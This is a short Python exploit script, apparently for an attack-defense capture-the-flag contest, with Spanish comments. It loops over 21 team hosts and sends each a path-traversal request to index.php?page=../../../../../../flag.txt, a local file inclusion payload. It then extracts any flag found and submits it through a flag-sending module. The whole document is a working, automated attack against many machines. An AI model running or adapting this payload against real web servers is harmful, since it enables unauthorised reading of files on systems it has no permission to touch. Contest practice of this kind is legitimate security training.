import requests
import sys
sys.path.append('.')
from flag_sender import extract_flag, send_flag

N_EQUIPOS = 21
targets = [f'10.66.{i}.4' for i in range(1, N_EQUIPOS + 1)]
port = 8080

for ip in targets:
    url = f"http://{ip}:{port}/index.php?page=../../../../../../flag.txt" #Ajustar ruta para LFI
    try:
        r = requests.get(url, timeout=3)
        if r.status_code == 200:
            flag = extract_flag(r.text)
            if flag:
                print(f"[+] Flag encontrada en {ip}: {flag}")
                print(send_flag(flag))
            else:
                print(f"[-] No se encontró flag en {ip}")
        else:
            print(f"[-] {ip} devolvió status {r.status_code}")
    except Exception as e:
        print(f"[!] Error en {ip}: {e}")
